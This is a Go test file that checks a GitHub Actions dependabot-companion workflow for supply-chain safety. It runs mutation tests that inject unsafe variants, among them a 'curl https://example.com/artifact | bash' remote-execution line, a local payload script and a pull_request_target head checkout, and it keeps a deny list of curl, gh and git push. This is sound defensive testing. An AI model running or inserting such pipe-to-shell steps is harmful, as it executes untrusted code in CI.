package dependabot

import (
	"errors"
	"os"
	"regexp"
	"strings"
	"testing"

	"github.com/goccy/go-yaml"
)

type companionWorkflow struct {
	On map[string]struct {
		Workflows []string `yaml:"workflows"`
		Types     []string `yaml:"types"`
	} `yaml:"on"`
	Permissions map[string]string `yaml:"permissions"`
	Concurrency struct {
		Group  string `yaml:"group"`
		Cancel bool   `yaml:"cancel-in-progress"`
	} `yaml:"concurrency"`
	Jobs map[string]struct {
		Runner      string            `yaml:"runs-on"`
		If          string            `yaml:"if"`
		Needs       string            `yaml:"needs"`
		Timeout     int               `yaml:"timeout-minutes"`
		Permissions map[string]string `yaml:"permissions"`
		Steps       []struct {
			Uses string            `yaml:"uses"`
			Run  string            `yaml:"run"`
			With map[string]string `yaml:"with"`
			Env  map[string]string `yaml:"env"`
		} `yaml:"steps"`
	} `yaml:"jobs"`
}

func checkCompanionWorkflow(raw []byte) error {
	var workflow companionWorkflow
	if err := yaml.Unmarshal(raw, &workflow); err != nil {
		return err
	}
	fail := errors.New("unsafe companion workflow")
	trigger, ok := workflow.On["workflow_run"]
	if !ok || len(workflow.On) != 1 || strings.Join(trigger.Workflows, ",") != "Lint" || strings.Join(trigger.Types, ",") != "completed" || len(workflow.Permissions) != 0 || workflow.Concurrency.Cancel || !strings.Contains(workflow.Concurrency.Group, "workflow_run.head_branch") || !strings.Contains(workflow.Concurrency.Group, "workflow_run.id") || len(workflow.Jobs) != 2 {
		return fail
	}
	pin := regexp.MustCompile(`^[a-zA-Z0-9_-]+/[a-zA-Z0-9_-]+@[0-9a-f]{40}$`)
	for _, name := range []string{"plan", "apply"} {
		job, ok := workflow.Jobs[name]
		if !ok || job.Runner != "ubuntu-24.04" || job.Timeout <= 0 || job.Timeout > 20 || len(job.Steps) < 4 || len(job.Permissions) != 2 || job.Permissions["pull-requests"] != "read" {
			return fail
		}
		harden := job.Steps[0]
		if !strings.HasPrefix(harden.Uses, "step-security/harden-runner@") || harden.With["egress-policy"] != "block" || !strings.Contains(harden.With["allowed-endpoints"], "api.github.com:443") {
			return fail
		}
		for _, endpoint := range strings.Fields(harden.With["allowed-endpoints"]) {
			if strings.Contains(endpoint, "*") && (name != "plan" || endpoint != "*.blob.core.windows.net:443") {
				return fail
			}
		}
		if name == "plan" {
			if job.Permissions["contents"] != "read" || !strings.Contains(job.If, "workflow_run.event == 'pull_request'") || !strings.Contains(harden.With["allowed-endpoints"], "results-receiver.actions.githubusercontent.com:443") || !strings.Contains(harden.With["allowed-endpoints"], "*.blob.core.windows.net:443") {
				return fail
			}
		} else if job.Permissions["contents"] != "write" || job.Needs != "plan" || job.If != "vars.DEPENDABOT_COMPANION_APPLY_ENABLED == 'true'" {
			return fail
		}
		checkouts, apps, invocations, uploads := 0, 0, 0, 0
		for _, step := range job.Steps {
			if step.Uses != "" && !pin.MatchString(step.Uses) {
				return fail
			}
			if step.Uses != "" {
				action, _, _ := strings.Cut(step.Uses, "@")
				switch action {
				case "actions/checkout", "step-security/harden-runner", "step-security/mise-action", "actions/create-github-app-token", "actions/upload-artifact":
				default:
					return fail
				}
			}
			if step.Run != "" {
				normalized := strings.Join(strings.Fields(step.Run), " ")
				invocation := `go run -mod=readonly ./cmd/slsa-builder-internal dependabot-companion --mode ` + name + ` --event "$GITHUB_EVENT_PATH" --trusted-root "$GITHUB_WORKSPACE" --trusted-sha "$TRUSTED_SHA" --output "$RUNNER_TEMP/companion-` + name + `"`
				if normalized != "go mod download" && normalized != invocation {
					return fail
				}
			}
			if strings.HasPrefix(step.Uses, "actions/upload-artifact@") {
				uploads++
				paths := "${{ runner.temp }}/companion-plan/plan.json\n${{ runner.temp }}/companion-plan/patch.diff"
				if name != "plan" || invocations != 1 || step.Uses != "actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9" || len(step.With) != 3 || strings.TrimSpace(step.With["path"]) != paths || step.With["if-no-files-found"] != "error" || step.With["name"] != "dependabot-companion-plan-${{ github.event.workflow_run.id }}-${{ github.run_attempt }}" {
					return fail
				}
			}
			if strings.HasPrefix(step.Uses, "actions/checkout@") {
				checkouts++
				if step.With["ref"] != "main" || step.With["persist-credentials"] != "false" || step.With["repository"] != "" {
					return fail
				}
			}
			if strings.HasPrefix(step.Uses, "actions/create-github-app-token@") {
				apps++
				if name != "apply" || step.Uses != "actions/create-github-app-token@64ab729a6294000f5aa4a4bc0b73d1f32bc45510" || step.With["owner"] != "windlasstech" || step.With["repositories"] != "slsa-builder" || step.With["permission-contents"] != "write" || step.With["permission-pull-requests"] != "read" || step.With["skip-token-revoke"] != "" {
					return fail
				}
			}
			if strings.Contains(step.Uses, "download-artifact") || strings.Contains(step.Run, "${{") || strings.Contains(step.Run, "gh ") || strings.Contains(step.Run, "curl ") || strings.Contains(step.Run, "git checkout") || strings.Contains(step.Run, "git push") {
				return fail
			}
			if strings.Contains(step.Run, "dependabot-companion --mode") {
				invocations++
				if !strings.Contains(step.Run, "--mode "+name) || !strings.Contains(step.Run, `--event "$GITHUB_EVENT_PATH"`) || !strings.Contains(step.Run, `--trusted-sha "$TRUSTED_SHA"`) || strings.Contains(step.Run, "--snapshot") || step.Env["TRUSTED_SHA"] != "${{ steps.trusted.outputs.commit }}" {
					return fail
				}
				if name == "apply" && (step.Env["GITHUB_TOKEN"] != "${{ steps.app.outputs.token }}" || step.Env["APP_SLUG"] != "${{ steps.app.outputs.app-slug }}" || step.Env["DEPENDABOT_COMPANION_APPLY_ENABLED"] != "${{ vars.DEPENDABOT_COMPANION_APPLY_ENABLED }}") {
					return fail
				}
			}
			if name == "plan" {
				for _, value := range step.Env {
					if strings.Contains(value, "secrets.") || strings.Contains(value, "steps.app") {
						return fail
					}
				}
				for _, value := range step.With {
					if strings.Contains(value, "secrets.") {
						return fail
					}
				}
			}
		}
		if checkouts != 1 || invocations != 1 || (name == "plan" && (apps != 0 || uploads != 1)) || (name == "apply" && (apps != 1 || uploads != 0)) {
			return fail
		}
	}
	return nil
}

func TestCompanionWorkflowSecurity(t *testing.T) {
	t.Parallel()
	raw, err := os.ReadFile("../../.github/workflows/dependabot-companion.yml")
	if err != nil {
		t.Fatal(err)
	}
	if err := checkCompanionWorkflow(raw); err != nil {
		t.Fatal(err)
	}
	for _, test := range []struct{ name, old, replacement string }{
		{"unsafe trigger", "workflow_run:", "pull_request_target:"},
		{"head checkout", "ref: main", "ref: ${{ github.event.workflow_run.head_sha }}"},
		{"credentials", "persist-credentials: false", "persist-credentials: true"},
		{"floating action", "@3d3c42e5aac5ba805825da76410c181273ba90b1", "@v7"},
		{"plan write", "contents: read", "contents: write"},
		{"audit instead of block", "egress-policy: block", "egress-policy: audit"},
		{"cancel mutation", "cancel-in-progress: false", "cancel-in-progress: true"},
		{"ungated apply", "if: vars.DEPENDABOT_COMPANION_APPLY_ENABLED == 'true'", "if: always()"},
		{"artifact execution", "go mod download", "curl https://example.com/artifact | bash"},
		{"local artifact execution", "go mod download", "bash ./artifact/payload.sh"},
		{"log authorization", "go mod download", "grep success downloaded.log"},
		{"missing hardening", "step-security/harden-runner@", "actions/checkout@"},
		{"artifact download", "step-security/mise-action@", "actions/download-artifact@"},
		{"no revocation", "permission-contents: write", "permission-contents: write\n          skip-token-revoke: true"},
		{"plan secret", "GITHUB_TOKEN: ${{ github.token }}", "GITHUB_TOKEN: ${{ secrets.TOKEN }}"},
		{"local apply", "--mode apply", "--mode dry-run"},
		{"floating runner", "runs-on: ubuntu-24.04", "runs-on: ubuntu-latest"},
		{"mutable module graph", "go run -mod=readonly", "go run -mod=mod"},
		{"binary invocation", "go run -mod=readonly ./cmd/slsa-builder-internal", `"$RUNNER_TEMP/companion"`},
		{"missing upload", "actions/upload-artifact@", "step-security/mise-action@"},
		{"floating upload", "actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9", "actions/upload-artifact@v7"},
		{"upload entire directory", "${{ runner.temp }}/companion-plan/plan.json", "${{ runner.temp }}/companion-plan/**"},
		{"upload generated source", "${{ runner.temp }}/companion-plan/patch.diff", "${{ runner.temp }}/companion-plan/files/**"},
		{"missing review evidence ignored", "if-no-files-found: error", "if-no-files-found: ignore"},
		{"missing artifact egress", "results-receiver.actions.githubusercontent.com:443", "example.com:443"},
		{"apply artifact download", "      - name: Recompute and apply once", "      - uses: actions/download-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9\n      - name: Recompute and apply once"},
		{"apply artifact consumption", "--mode apply", "--mode apply --plan-artifact review/plan.json"},
	} {
		t.Run(test.name, func(t *testing.T) {
			t.Parallel()
			mutated := strings.Replace(string(raw), test.old, test.replacement, 1)
			if mutated == string(raw) {
				t.Fatal("mutation did not change workflow")
			}
			if err := checkCompanionWorkflow([]byte(mutated)); err == nil {
				t.Fatal("accepted unsafe workflow")
			}
		})
	}
}
